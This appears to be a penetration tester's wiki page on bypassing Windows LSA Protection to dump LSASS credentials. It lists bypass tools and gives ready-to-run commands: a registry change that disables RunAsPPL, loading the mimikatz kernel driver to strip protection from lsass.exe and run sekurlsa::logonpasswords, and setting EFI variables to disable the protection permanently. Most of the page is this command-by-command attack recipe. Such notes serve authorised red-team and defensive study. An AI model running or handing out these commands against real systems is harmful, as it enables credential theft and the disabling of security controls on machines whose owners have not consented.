---
title: LSASS Dump against LSA Protection
---

[[notes/windows/lsass-dump]] when LSASS runs as [[notes/windows/ppl|PPL]] process.
This blocks *Security Support Providers* like the [[notes/tools/mimikatz]] `misc:memssp` module and is enabled by default on Windows 11 ([source](http://web.archive.org/web/20230530211030/https://emptydc.com/2022/06/08/windows-credential-dumping/)).

Other tools:

- [PPLdump](https://github.com/itm4n/ppldump), patched since Windows 10 21H2 Build 19044.1826 ([source](http://web.archive.org/web/20221111124550/https://itm4n.github.io/the-end-of-ppldump/))
- [PPLKiller](https://github.com/redcursorsecurityconsulting/pplkiller), loads malicious driver, worked on Windows 10.0.19042

Untested tools:

- [PPLFault](https://github.com/gabriellandau/PPLFault/), exploits TOCTOU in Windows Code Integrity to achieve code execution as WinTcb-Light
- [PPLmedic](https://github.com/itm4n/PPLmedic), also see [Bypassing PPL in Userland (again)](https://web.archive.org/web/20230318085001/https://blog.scrt.ch/2023/03/17/bypassing-ppl-in-userland-again/), patched in Windows 11 Insider ([source](https://twitter.com/depletionmode/status/1637179196270051329))

References:

- [Do you really know about LSA Protection (RunAsPPL)?](http://web.archive.org/web/20221111124635/https://itm4n.github.io/lsass-runasppl/)
- [Duping AV with handles](http://web.archive.org/web/20221111124905/https://scribe.rip/@skelsec/duping-av-with-handles-537ef985eb03)

# Discovery

Check for *LSA Protection*.

=== "builtin"
    ~~~ bat
    reg.exe query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
    ~~~

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb ws01.corp.com --local-auth -u administrator -p 'passw0rd' -M runasppl
    ~~~

Check for Secure Boot with `msinfo32`.

# Without Secure Boot

Disable *LSA Protection* in the registry, reboot, wait for users to log back in and dump LSASS.
The registry value is ignored when Secure Boot is enabled.

~~~ bat
reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 00000000 /f
~~~

# Against Secure Boot

Patch *LSA Protection* in memory until the next reboot trough [[notes/tools/mimikatz]] kernel driver, then proceed to dump LSASS.

~~~ bat
sc.exe create katzsvc binPath= %cd%\mimidrv.sys type= kernel start= demand
sc.exe start katzsvc
.\mimikatz.exe "!processprotect /process:lsass.exe /remove" sekurlsa::logonpasswords exit
sc.exe stop katzsvc
sc.exe delete katzsvc
~~~

Or place `mimidrv.sys` next to `mimikatz.exe` and do everything in one go.

~~~ bat
.\mimikatz.exe token::elevate privilege::debug !+ "!processprotect /process:lsass.exe /remove" sekurlsa::logonpasswords !- exit
~~~

To disable *LSA Protection* permanently set EFI variables trough the kernel driver.

~~~ bat
.\mimikatz.exe "sysenv::get /name:Kernel_Lsa_Ppl_Config /guid:{77fa9abd-0359-4d32-bd60-28f4e78f784b}" exit
.\mimikatz.exe privilege::sysenv "!+" "!sysenv::set /name:Kernel_Lsa_Ppl_Config /guid:{77fa9abd-0359-4d32-bd60-28f4e78f784b} /attributes:0x07 /data:00000000" "!-"  exit
~~~

Alternatively disable LSA protection permanently with the official [LSA Protected Process Opt-out](https://www.microsoft.com/en-us/download/details.aspx?id=40897).
It seems like this can be done with just `bcdedit.exe` as well ([source](http://web.archive.org/web/20221206133633/http://publications.alex-ionescu.com/NoSuchCon/NoSuchCon%202014%20-%20Unreal%20Mode%20-%20Breaking%20Protected%20Processes.pdf)).
